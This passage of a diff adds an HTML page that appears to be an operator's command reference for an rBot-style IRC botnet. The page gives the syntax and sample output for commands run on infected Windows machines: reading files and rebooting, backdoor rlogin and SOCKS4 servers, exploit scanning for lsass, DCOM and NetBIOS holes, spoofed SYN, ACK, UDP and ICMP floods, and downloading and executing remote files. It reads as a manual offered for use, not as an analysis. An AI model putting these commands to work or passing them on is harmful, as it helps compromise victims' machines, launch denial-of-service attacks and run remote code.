+      quit (Quit: what) </td></tr><!--
+readfile
+-->
+  <tr>
+    <td>readfile </td>
+    <td>rf </td>
+    <td>.readfile <filename> </filename></td>
+    <td>Reads the contents of a file. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .read 
+      onelinefile.txt<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; This is one 
+      line<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [MAIN]: Read file complete: 
+      onelinefile.txt </td></tr><!--
+reboot
+-->
+  <tr>
+    <td>reboot </td>
+    <td>  </td>
+    <td>.reboot </td>
+    <td>Reboots the users machine. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .reboot<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [MAIN]: Rebooting system. </td></tr><!--
+reconnect
+-->
+  <tr>
+    <td>reconnect </td>
+    <td>r </td>
+    <td>.reconnect </td>
+    <td>Reconnects, getting a new ident and nickname. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .reconnect<br>* ]URXBOTBot[-32315 has quit 
+      (Quit: Client Exited)<br>* qewuyuf has joined #moose </td></tr><!--
+remove
+-->
+  <tr>
+    <td>remove </td>
+    <td>rm </td>
+    <td>.remove </td>
+    <td>Removes the bot completely. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .remove<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [MAIN]: Removing Bot. </td></tr><!--
+rename
+-->
+  <tr>
+    <td>rename </td>
+    <td>mv </td>
+    <td>.rename <old> <new> </new></old></td>
+    <td>Renames <old> to <new> </new></old></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .rename C:\Screenshot.jpg 
+      C:\hell.jpg<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [FILE]: Rename: 
+      'C:\Screenshot' to: 'C:\hell.jpg'. </td></tr><!--
+repeat
+-->
+  <tr>
+    <td>repeat </td>
+    <td>rp </td>
+    <td>.rename <number times="" of=""> <command> </command></number></td>
+    <td>Repeats <command> <times>. </times></command></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .repeat 3 ,privmsg #moose 
+      hello<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; hello<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; hello<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; 
+      hello </td></tr><!--
+rloginserver
+-->
+  <tr>
+    <td>rloginserver </td>
+    <td>rlogin </td>
+    <td>.rloginserver [port] [username] </td>
+    <td>Starts a Rlogin server. Rlogin is what the rBot creators have done so 
+      you can remotely access the bot, without having be on IRC. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .rloginserver<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [RLOGIND]: Server listening on IP: 
+      216.239.33.101:37, Username: moose. </td></tr><!--
+rloginstop
+-->
+  <tr>
+    <td>rloginstop </td>
+    <td>  </td>
+    <td>.rloginstop </td>
+    <td>Stops a rlogin server. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .rloginstop<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [RLOGIND]: Server stopped. (1 thread(s) 
+      stopped). </td></tr><!--
+rndnick
+-->
+  <tr>
+    <td>rndnick </td>
+    <td>rn </td>
+    <td>.rndnick </td>
+    <td>Change to a random nick. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .rndnick<br>* ]URXBOTBot[-32315 is now know 
+      as howshos </td></tr><!--
+secure
+-->
+  <tr>
+    <td>secure </td>
+    <td>sec<br>unsecure<br>unsec </td>
+    <td>.secure </td>
+    <td>Makes sure that any holes that are exploitable are patched up. Giving 
+      it the "secure" look. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .secure<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [SECURE]: Securing system. </td></tr><!--
+securestop
+-->
+  <tr>
+    <td>securestop </td>
+    <td>  </td>
+    <td>.securestop </td>
+    <td>Stops any securing possible. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .securestop<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [SECURE]: Securing stopped. (1 thread(s) 
+      stopped). </td></tr><!--
+server
+-->
+  <tr>
+    <td>server </td>
+    <td>se </td>
+    <td>.server <new server=""> </new></td>
+    <td>Updates the server to the new server. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .server 
+      irc.dal.net<br>&lt;<span class="user">@URXBOT</span>&gt; 
+      .reconnect<br>[Connects to irc.dal.net...] </td></tr><!--
+socks4
+-->
+  <tr>
+    <td>socks4 </td>
+    <td>s4 </td>
+    <td>.socks4 [new server] [-a] </td>
+    <td>Starts a socks4 server on the computer on the port specified in 
+      config.h, or by a number given by command. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .socks4<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [SOCKS4]: Server started on: 
+      216.239.33.101:28364 </td></tr><!--
+socks4stop
+-->
+  <tr>
+    <td>socks4stop </td>
+    <td>  </td>
+    <td>.socks4stop </td>
+    <td>Stops a socks4 server </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .socks4stop<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [SOCKS4]: Server stopped. (1 thread(s) 
+      stopped.) </td></tr><!--
+status
+-->
+  <tr>
+    <td>status </td>
+    <td>s </td>
+    <td>.status </td>
+    <td>Returns the uptime of the bot. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .status<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [MAIN]: Status: Ready. Bot Uptime: 11d 4h 3m. 
+    </td></tr><!--
+sysinfo
+-->
+  <tr>
+    <td>sysinfo </td>
+    <td>si </td>
+    <td>.sysinfo </td>
+    <td>Returns information about the system. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .sysinfo<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [<b>SYSINFO</b>]: [<b>CPU</b>]: 2210MHz. 
+      [<b>RAM</b>]: 1,048,576KB total, 649,216KB free. [<b>Disk</b>]: 
+      10,506,476KB total, 4,446,864KB free. [<b>OS</b>]: Windows XP (Service 
+      Pack 1) (5.1, Build 2600). [<b>Sysdir</b>]: C:\WINDOWS\System32. 
+      [<b>Hostname</b>]: microsoft.com (207.46.134.155). [<b>Current User</b>]: 
+      Bill Gates. [<b>Date</b>]: 02:Jun:2004. [<b>Time</b>]: 23:04:47. 
+      [<b>Uptime</b>]: 17d 8h 28m. </td></tr><!--
+threads
+-->
+  <tr>
+    <td>threads </td>
+    <td>t </td>
+    <td>.threads </td>
+    <td>Lists all the current threads. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .threads<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; -[Thread List]-<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; 0. [MAIN]: Bot started.<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; 1. [IDENTD]: Server running on Port: 
+      113.<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; 2. [TCP]: Spoofed ack 
+      flooding: (24.222.212.37:337) for 120 seconds.<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; 3. [TFTP]: Server started on Port: 2183, File: 
+      C:\WINDOWS\System32\commmand.exe, Request: commmand.exe.<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; 4. [THREADS]: List threads. </td></tr><!--
+uptime
+-->
+  <tr>
+    <td>uptime </td>
+    <td>up </td>
+    <td>.uptime </td>
+    <td>Returns the uptime of the system. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .uptime<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [MAIN]: Uptime: 17d 8h 28m. </td></tr><!--
+version
+-->
+  <tr>
+    <td>version </td>
+    <td>ver </td>
+    <td>.version </td>
+    <td>Outputs the version specified in config.h. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .version<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [MAIN]: rBot-Moose </td></tr><!--
+visit
+-->
+  <tr>
+    <td>visit </td>
+    <td>v </td>
+    <td>.visit <uri> [referrer] </uri></td>
+    <td>Visits <uri> </uri></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .visit 
+      http://www.kernel.org<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [VISIT]: URL 
+      visited. </td></tr><!--
+who
+-->
+  <tr>
+    <td>who </td>
+    <td>  </td>
+    <td>.who </td>
+    <td>Returns who is logged in, and the amount of slots left to fill. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .who<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; -[Login List]-<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; 0. moose!moose@internet.yahoo.com<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; 1. 
+      antelope!deer@i-own.blogspot.com<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; 
+      2. <empty><br></empty></td></tr><!-- 
+Scanning
+-->
+  <tr>
+    <td class="headers"><a name="scanning" href="#scanning">Scanning Functions</a> </td></tr><!-- 
+advscan 
+-->
+  <tr>
+    <td>advscan </td>
+    <td>asc </td>
+    <td>.advscan <exploit> <threads> <delay> <time> <ip>
+      [ip] [-abr] </ip></time></delay></threads></exploit></td>
+    <td>Starts a scan using <method> (check advscan.cpp) with <threads> on a delay of <delay>, for <time> on <ip> If -a is 
+      specified, starts a scan using the A class on the bot. Likewise with -b. 
+      Using -r makes the rest of the ip become random. If a,b or r aren't 
+      specified, the [ip] must be in format: A.B.C.D. X can be used as one of 
+      the numbers, as it is evaluated as a random number. </ip></time></delay></threads></method></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .advscan netbios 100 5 120 -b 
+      -r<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [SCAN]: Random Port Scan 
+      started on 192.168.x.x:139 with a delay of 5 seconds for 120 minutes using 
+      100 threads. </td></tr><!-- 
+scan
+-->
+  <tr>
+    <td>scan </td>
+    <td>sc </td>
+    <td>.scan <ip> <port> <delay> </delay></port></ip></td>
+    <td>Starts a port scan at <ip>:<port> with delays of 
+      <delay>. </delay></port></ip></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .scan 24.222.212.37 445 
+      10<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [SCAN]: Port scan started: 
+      24.222.212.37:445 with delay: 10(ms). </td></tr><!-- 
+scanstats
+-->
+  <tr>
+    <td>scanstats </td>
+    <td>stats </td>
+    <td>.scanstats </td>
+    <td>Returns various information about a scan. Returning how many exploits 
+      there has been found. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .scanstats<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [SCAN]: Exploit Statistics: WebDav: 0, NetBios: 
+      0, NTPass: 0, Dcom135: 0, Dcom445: 0, Dcom1025: 0, Dcom2: 0, MSSQL: 0, 
+      Beagle1: 0, Beagle2: 0, MyDoom: 0, lsass: 10, Optix: 0, UPNP: 0, NetDevil: 
+      0, DameWare: 0, Kuang2: 0, Sub7: 0, Total: 0 in 0d 0h 0m. </td></tr><!-- 
+scanstop
+-->
+  <tr>
+    <td>scanstop </td>
+    <td>  </td>
+    <td>.scanstop </td>
+    <td>Stops whatever scans are in progress and kills the threads. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .scanstop<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [SCAN]: Scan stopped. (11 thread(s) stopped.) 
+    </td></tr><!--
+Clones
+-->
+  <tr>
+    <td class="headers"><a name="clones" href="#clones">Clone Functions</a> </td></tr><!-- 
+c_action
+-->
+  <tr>
+    <td>c_action </td>
+    <td>c_a </td>
+    <td>.c_action <thread> <channel> <message> </message></channel></thread></td>
+    <td>Causes a clone (thread: <thread>) to do an action to 
+      <channel> with <message> </message></channel></thread></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .c_action 1 #help partially 
+      stabz self<br>[In #help...]<br>* clonal partially stabz self </td></tr><!--
+c_join
+-->
+  <tr>
+    <td>c_join </td>
+    <td>c_j </td>
+    <td>.c_join <thread> <channel> [key] </channel></thread></td>
+    <td>Causes a clone (thread: <thread>) to join <channel> with 
+      [key] </channel></thread></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .c_join 1 #Chat<br>[In 
+      #Chat...]<br>* clonal has join #Chat </td></tr><!-- 
+c_mode 
+-->
+  <tr>
+    <td>c_mode </td>
+    <td>c_m </td>
+    <td>.c_mode <thread> <channel> <modes> </modes></channel></thread></td>
+    <td>Causes a clone (thread: <thread>) to do <modes> in 
+      <channel> </channel></modes></thread></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .c_mode 1 #chat +o moose<br>[In 
+      #Chat...]<br>* clonal has set mode +o moose </td></tr><!-- 
+c_nick 
+-->
+  <tr>
+    <td>c_nick </td>
+    <td>c_n </td>
+    <td>.c_nick <thread> <new nick=""> </new></thread></td>
+    <td>Causes a clone (thread: <thread>) to change nicks to <new nick=""> </new></thread></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .c_nick 1 clenal<br>* clonal is 
+      now know as clenal </td></tr><!-- 
+c_privmsg 
+-->
+  <tr>
+    <td>c_privmsg </td>
+    <td>c_pm </td>
+    <td>.c_privmsg <thread> <channel> <message> </message></channel></thread></td>
+    <td>Causes a clone (thread: <thread>) to send <message> to 
+      <channel> </channel></message></thread></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .c_privmsg 1 #chat Hello 
+      lusers.<br>[In #Chat...]<br><clonal> Hello lusers. </clonal></td></tr><!-- 
+c_quit 
+-->
+  <tr>
+    <td>c_quit </td>
+    <td>c_q </td>
+    <td>.c_quit <thread> </thread></td>
+    <td>Causes a clone (thread: <thread>) to quit. </thread></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .c_quit 1<br>* clone has quit 
+      (Quit: later.) </td></tr><!--
+c_raw 
+-->
+  <tr>
+    <td>c_raw </td>
+    <td>c_r </td>
+    <td>.c_raw <thread> <irc raw=""> </irc></thread></td>
+    <td>Causes a clone (thread: <thread>) to send <irc raw=""> to the 
+      server </irc></thread></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .c_raw 1 QUIT :wut<br>* clone 
+      has quit (Quit: wut) </td></tr><!-- 
+c_rndnick
+-->
+  <tr>
+    <td>c_rndnick </td>
+    <td>c_rn </td>
+    <td>.c_rndnick <thread> </thread></td>
+    <td>Causes a clone (thread: <thread>) to change to a random nick. 
+</thread></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .c_rndnick<br>* clone is now 
+      know as esfgisd </td></tr><!--
+DDoS Floods
+-->
+  <tr>
+    <td class="headers"><a name="ddos" href="#ddos">DDoS Functions</a> </td></tr><!-- 
+ddos.stop
+-->
+  <tr>
+    <td>ddos.stop </td>
+    <td>  </td>
+    <td>.ddos.stop </td>
+    <td>Stops whatever DDoS threads there are. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .ddos.stop<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [DDoS] DDoS flood stopped. (1 thread(s) 
+      stopped) </td></tr><!-- 
+ddos.syn
+ddos.ack
+ddos.random
+-->
+  <tr>
+    <td>ddos.syn<br>ddos.ack<br>ddos.random<br></td>
+    <td>  </td>
+    <td>.ddos.syn <ip> <port> <length><br>.ddos.ack 
+      <ip> <port> <length><br>.ddos.random <ip> 
+      <port> <length><br></length></port></ip></length></port></ip></length></port></ip></td>
+    <td>Starts a DDoS (syn, ack, or random) on <ip>:<port> for 
+      <length> </length></port></ip></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .ddos.random<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [DDoS]: Flooding: (24.222.212.37:337) for 120 
+      seconds. </td></tr><!-- 
+icmpflood
+-->
+  <tr>
+    <td>icmpflood </td>
+    <td>icmp </td>
+    <td>.icmpflood <ip> <length> [-r] </length></ip></td>
+    <td>Starts a ICMP flood on <ip> for <length>. If -r is present 
+      it spoofs the IP's. </length></ip></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .icmpflood 24.222.212.37 120 
+      -r<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [ICMP]: Flooding: 
+      (24.222.212.37) for 60 seconds. </td></tr><!-- 
+pingflood
+-->
+  <tr>
+    <td>pingflood </td>
+    <td>ping<br>p </td>
+    <td>.pingflood <ip> <packets> <size packets="" of=""> 
+      <delay> </delay></size></packets></ip></td>
+    <td>Sends <number packets="" of=""> to <ip> with sizes of 
+      <size> and a delay of <delay>. </delay></size></ip></number></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .pingflood 24.222.212.37 120 
+      1000 4096 100<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [UDP]: Sending 1000 
+      packets to: 24.222.212.37. Packet size: 4096, Delay: 100(ms). </td></tr><!-- 
+pingstop
+-->
+  <tr>
+    <td>pingstop </td>
+    <td>  </td>
+    <td>.pingstop </td>
+    <td>Stops a pingflood. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .pingstop<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [PING] Ping flood stopped. (1 thread(s) 
+      stopped) </td></tr><!-- 
+synflood
+-->
+  <tr>
+    <td>synflood </td>
+    <td>syn </td>
+    <td>.synflood <ip> <port> <length> </length></port></ip></td>
+    <td>Synfloods <ip>:<port> for <length> seconds. </length></port></ip></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .synflood 24.222.212.37 337 
+      120<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [SYN]: Flooding: 
+      (24.222.212.37:337) for 120 seconds. </td></tr><!-- 
+synstop
+-->
+  <tr>
+    <td>synstop </td>
+    <td>  </td>
+    <td>.synstop </td>
+    <td>Stops a synflood. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .pingstop<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [SYN]: Syn flood stopped. (1 thread(s) 
+      stopped.) </td></tr><!-- 
+tcpflood
+-->
+  <tr>
+    <td>tcpflood </td>
+    <td>tcp </td>
+    <td>.tcpflood <method> <ip> <port> <length> [-r] 
+    </length></port></ip></method></td>
+    <td>Methods can be: syn, ack or random. TCP floods <ip>:<port> 
+      for <length> seconds. If -r is specified, flood is spoofed. </length></port></ip></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .tcpflood ack 24.222.212.37 337 
+      120 -r<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [TCP]: Spoofed ack 
+      flooding: (24.222.212.37:337) for 120 seconds. </td></tr><!-- 
+udpflood
+-->
+  <tr>
+    <td>udpflood </td>
+    <td>udp<br>u </td>
+    <td>.udpflood <ip> <packets> <size of=""> <delay> 
+      [port] </delay></size></packets></ip></td>
+    <td>UDPfloods <ip>:[port] (<packets>, all sizes of <size of="">) with a <delay> second delay </delay></size></packets></ip></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .udpflood 24.222.212.37 1000 
+      4096 100<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [UDP]: Sending 1000 
+      packets to: 24.222.212.37. Packet size: 4096, Delay: 100(ms). </td></tr><!-- 
+udpstop
+-->
+  <tr>
+    <td>udpstop </td>
+    <td>  </td>
+    <td>.udpstop </td>
+    <td>Stops a UDP flood. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .udpstop<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [UDP] UDP flood stopped. (1 thread(s) stopped) 
+    </td></tr><!--
+Updating and downloading
+-->
+  <tr>
+    <td class="headers"><a name="download_update" href="#download_update">Downloads</a> </td></tr><!--
+download
+-->
+  <tr>
+    <td>download </td>
+    <td>dl </td>
+    <td>.download <url> <destination> <action> </action></destination></url></td>
+    <td>Downloads <url> and saves to <destination>. If 
+      <action> is 1, file is also executed, otherwise it is just saved. 
+</action></destination></url></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .download 
+      http://nsa.gov/file.exe c:\windows\devldr32.exe 1<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [DOWNLOAD]: Downloading URL: 
+      http://nsa.gov/file.exe to: c:\windows\devldr32.exe.<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [DOWNLOAD]: Downloaded 92.1 KB to 
+      c:\windows\devldr32.exe @ 92.1 KB/sec.<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [DOWNLOAD]: Opened: c:\windows\devldr32.exe. 
+  </td></tr><!--
+update
+-->
+  <tr>
+    <td>update </td>
+    <td>  </td>
+    <td>.update <url> <id> </id></url></td>
+    <td>If <id> is different that of already on there, the file is 
+      downloaded and updated. </id></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .update http://nsa.gov/file.exe 
+      mouse1<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [UPDATE]: Downloading 
+      update from: http://nsa.gov/file.exe. </td></tr><!--
+Redirecting
+-->
+  <tr>
+    <td class="headers"><a name="redirecting" href="#redirecting">Redirecting</a> </td></tr><!--
+redirect
+-->
+  <tr>
+    <td>redirect </td>
+    <td>rd </td>
+    <td>.redirect <local port=""> <remote host=""> <remote port=""> 
+    </remote></remote></local></td>
+    <td>Creates a simple TCP redirection. A basic port forwarding section. 
+      Will forward all connections to <local port=""> to <remote host="">:<remote port="">. </remote></remote></local></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .redirect 80 www.google.com 
+      80<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [REDIRECT]: TCP redirect 
+      created from: 207.46.134.155:80 to: www.google.com:80. </td></tr><!--
+redirectstop
+-->
+  <tr>
+    <td>redirectstop </td>
+    <td>  </td>
+    <td>.redirectstop <thread> </thread></td>
+    <td>Stops a redirection. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .redirectstop 1<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [REDIRECT] TCP redirect stopped. (1 thread(s) 
+      stopped) </td></tr><!--
+TFTP Server
+-->
+  <tr>
+    <td class="headers"><a name="ftp" href="#ftp">FTP Functions</a><a> </a></td></tr><!--
+tftpserver
+-->
+  <tr>
+    <td>tftpserver </td>
+    <td>tftp </td>
+    <td>.tftpserver </td>
+    <td>I'm not sure what this does at the moment. I'm sure I'll work it out 
+      :-P </td>
+    <td>  </td></tr><!--
+tftpstop
+-->
+  <tr>
+    <td>tftpstop </td>
+    <td>  </td>
+    <td>.tftpstop </td>
+    <td>Stops a TFTP (Server? Download? Upload?) </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .tftpstop<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [TFTP] Server stopped. (1 thread(s) stopped) 
+  </td></tr><!--
+upload
+-->
+  <tr>
+    <td>upload </td>
+    <td>  </td>
+    <td>.upload *something* </td>
+    <td>I have absolutely <b>no</b> idea how this one works. </td>
+    <td>  </td></tr></tbody></table></td>
+</tr>
+</tbody></table>
+<table cellspacing="0" cellpadding="0" width="100%">
+<tbody><tr>
+<td class="news-footer" align="right">
+</td></tr>
+</tbody></table>
+</td>
+</tr>
+</tbody></table>
+</td>
+</tr>
+</tbody></table>
+<table width="100%" cellspacing="0" cellpadding="0">
+<tbody><tr>
+<td class="white-header">
+</td>
+</tr>
+</tbody></table>
+<table width="100%" cellspacing="0" cellpadding="0">
+<tbody><tr>
+<td class="full-header" align="center">
+</td>
+</tr>
+</tbody></table>
+</td>
+</tr>
+</tbody></table>
+</body></html>
